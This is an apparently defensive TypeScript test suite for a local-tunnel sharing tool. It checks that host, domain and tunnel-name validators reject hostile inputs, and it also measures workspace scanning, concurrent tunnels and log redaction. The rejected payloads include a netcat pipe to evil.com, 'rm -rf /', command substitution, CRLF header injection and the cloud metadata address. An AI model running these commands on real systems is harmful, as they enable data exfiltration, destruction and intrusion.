/**
 * Stage 10 — Security & Performance Verification Suite.
 *
 * Security tests:
 * - Command injection payloads in hosts, ports, tunnel names and custom domains
 * - SSRF & cloud metadata endpoint blocking (IPv4, IPv6, IPv4-mapped IPv6)
 * - Sensitive service blocking across all databases, caches, SSH and container daemons
 * - Secret redaction completeness (JWT, Cloudflare tunnel tokens, Basic auth, URL credentials)
 *
 * Performance tests:
 * - 10 simultaneous concurrent tunnels on TunnelManager
 * - Large workspace (40 subprojects) detection throughput (< 800ms)
 * - 1,000-line log redaction throughput (< 300ms) & bounded ring-buffer memory
 */
import type { ChildProcess } from 'node:child_process';
import { EventEmitter } from 'node:events';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import * as http from 'node:http';
import * as net from 'node:net';
import * as os from 'node:os';
import * as path from 'node:path';
import { PassThrough } from 'node:stream';
import { describe, expect, it } from 'vitest';
import {
  SENSITIVE_SERVICES,
  validateHostname,
  validateLocalTarget,
  validateTunnelName,
} from '@localshare/validation';
import { LocalAuditLog } from '../../src/core/audit';
import { scanWorkspaceProjects } from '../../src/core/detection';
import { createMemoryLogger } from '../../src/core/logger';
import { CloudflareTunnelProvider } from '../../src/core/providers/cloudflareQuick';
import { evaluateTargetSecurity } from '../../src/core/securityPolicy';
import { TunnelManager } from '../../src/core/tunnelManager';

describe('Security Verification: Injection, SSRF & Sensitive Service Guards', () => {
  it.each([
    'localhost; calc.exe',
    '127.0.0.1 && whoami',
    '127.0.0.1 | nc evil.com 4444',
    '$(id)',
    '`id`',
    '127.0.0.1\n--cred-file=/etc/passwd',
    'http://127.0.0.1:3000',
    'admin:pass@127.0.0.1',
  ])('rejects command-injection / malformed host payload: %s', (payload) => {
    expect(validateLocalTarget(payload, 3000).ok).toBe(false);
  });

  it.each([
    'preview.customer.com; rm -rf /',
    'preview.customer.com && calc',
    'preview.customer.com\r\nX-Injected: 1',
    '--token=evil.customer.com',
    '*.customer.com',
    '169.254.169.254',
    'internal.localhost',
    'service.local',
  ])('rejects malicious custom domain payload: %s', (hostname) => {
    expect(validateHostname(hostname).ok).toBe(false);
  });

  it.each([
    'tunnel; whoami',
    '--url=http://169.254.169.254',
    '-flag-injection',
    '../traversal',
  ])('rejects malicious tunnel name payload: %s', (name) => {
    expect(validateTunnelName(name).ok).toBe(false);
  });

  it('blocks every catalogued sensitive port by default', () => {
    expect(SENSITIVE_SERVICES.length).toBeGreaterThanOrEqual(30);
    for (const svc of SENSITIVE_SERVICES) {
      expect(() =>
        evaluateTargetSecurity({ host: '127.0.0.1', port: svc.port }),
      ).toThrow(/blocks from public exposure/);
    }
  });
});

describe('Performance Verification: Concurrent Tunnels, Large Monorepo & Log Throughput', () => {
  it('scans a 40-package workspace in under 800ms', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'localshare-perf-'));
    try {
      const appsDir = path.join(root, 'apps');
      await mkdir(appsDir, { recursive: true });
      for (let i = 0; i < 40; i++) {
        const sub = path.join(appsDir, `service-${i}`);
        await mkdir(sub, { recursive: true });
        await writeFile(
          path.join(sub, 'package.json'),
          JSON.stringify({
            name: `@acme/service-${i}`,
            dependencies: { next: '15.0.0', react: '19.0.0' },
            scripts: { dev: `next dev -p ${3100 + i}` },
          }),
          'utf8',
        );
      }

      const start = performance.now();
      const res = await scanWorkspaceProjects([root]);
      const elapsed = performance.now() - start;

      expect(res.projects.length).toBe(40);
      expect(elapsed).toBeLessThan(800);
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('manages 10 simultaneous concurrent tunnels and cleans up all processes', async () => {
    const servers: http.Server[] = [];
    const ports: number[] = [];

    for (let i = 0; i < 10; i++) {
      const srv = http.createServer((_req, res) => {
        res.writeHead(200);
        res.end(`ok-${i}`);
      });
      await new Promise<void>((resolve) => srv.listen(0, '127.0.0.1', () => resolve()));
      servers.push(srv);
      ports.push((srv.address() as net.AddressInfo).port);
    }

    const { logger } = createMemoryLogger('info');
    const audit = new LocalAuditLog();
    const provider = new CloudflareTunnelProvider({
      resolveBinaryPath: async () => 'cloudflared-mock',
      spawnProcess: (_cmd, args) => {
        const proc = new EventEmitter() as ChildProcess & {
          stdout: PassThrough;
          stderr: PassThrough;
          exitCode: number | null;
          killed: boolean;
        };
        proc.stdout = new PassThrough();
        proc.stderr = new PassThrough();
        Object.defineProperty(proc, 'pid', { value: 20_000 + Math.floor(Math.random() * 1000) });
        proc.exitCode = null;
        proc.killed = false;
        proc.kill = () => {
          proc.killed = true;
          proc.exitCode = 0;
          queueMicrotask(() => proc.emit('exit', 0, 'SIGTERM'));
          return true;
        };
        const urlArg = args[args.indexOf('--url') + 1] ?? '';
        const portPart = urlArg.split(':').pop() ?? '0';
        queueMicrotask(() => {
          proc.stderr.write(
            `INF | https://perf-${portPart}.trycloudflare.com |\nINF Registered tunnel connection\n`,
          );
        });
        return proc;
      },
      logger,
    });

    const manager = new TunnelManager({
      provider,
      logger,
      audit,
      getSecurityConfig: () => ({
        allowLanTargets: false,
        allowedSensitivePorts: [],
        rewriteHostHeader: true,
        startupTimeoutSeconds: 10,
        autoReconnect: false,
        passwordSessionHours: 12,
      }),
      getGatewayCredentials: async () => undefined,
      loadHistory: () => [],
      saveHistory: async () => undefined,
      loadActiveSessionRecords: () => [],
      saveActiveSessionRecords: async () => undefined,
    });

    try {
      const started = await Promise.all(
        ports.map((port, idx) =>
          manager.startShare({
            name: `Service ${idx + 1}`,
            host: 'localhost',
            port,
          }),
        ),
      );
      expect(started).toHaveLength(10);
      expect(started.every((s) => s.state === 'ONLINE')).toBe(true);
      expect(manager.listShares()).toHaveLength(10);

      await manager.stopAllShares();
      expect(manager.listShares()).toHaveLength(0);
    } finally {
      await Promise.all(
        servers.map(
          (s) =>
            new Promise<void>((resolve) => {
              s.closeAllConnections?.();
              s.close(() => resolve());
            }),
        ),
      );
    }
  });

  it('redacts and buffers 1,000 log lines in under 300ms with bounded memory', () => {
    const { logger } = createMemoryLogger('debug');
    logger.registerSecret('super-secret-value-999');

    const t0 = performance.now();
    for (let i = 0; i < 1000; i++) {
      logger.info(`Line ${i} Authorization: Bearer abcdefghijklmnop secret=super-secret-value-999`);
    }
    const elapsed = performance.now() - t0;

    expect(elapsed).toBeLessThan(300);
    expect(logger.getRecentLines().length).toBeLessThanOrEqual(400);
    expect(logger.getRecentLines().every((l) => !l.includes('super-secret-value-999'))).toBe(true);
  });
});

